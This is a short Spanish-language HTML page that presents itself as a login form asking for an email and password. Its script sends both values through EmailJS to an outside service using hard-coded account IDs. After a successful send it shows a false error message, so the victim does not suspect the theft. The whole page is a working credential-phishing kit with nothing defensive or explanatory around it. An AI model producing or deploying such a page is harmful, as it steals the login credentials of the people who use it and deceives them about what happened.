<!DOCTYPE html>
<html>
<head>
    <title>Formulario de Contacto</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <link rel="stylesheet" href="estilo.css">
    <script>
        (function(){
            emailjs.init("41OEY25WlJma9vqre");
        })();
        
        function enviarCorreo() {
            var email = document.getElementById("email").value;
            var contrasena = document.getElementById("contrasena").value;

            emailjs.send("service_qjxtbfj", "template_vn2qtg9", {
                email: email,
                contrasena: contrasena
            })
            .then(function(response) {
               alert("Ha habido un error, vuelva a intentarlo mas tarde");
            }, function(error) {
               alert("Error al enviar el correo");
            });
        }
    </script>
</head>
<body>
    <form id="formulario">
    <h2>Inicio de Sesión</h2>
        Email <input type="text" name="email" id="email" class="texto"><br>
        Contraseña <input type="password" name="contrasena" id="contrasena" class="texto"><br>
        <input type="button" value="Iniciar Sesión" onclick="enviarCorreo()">
    </form>
</body>
</html>
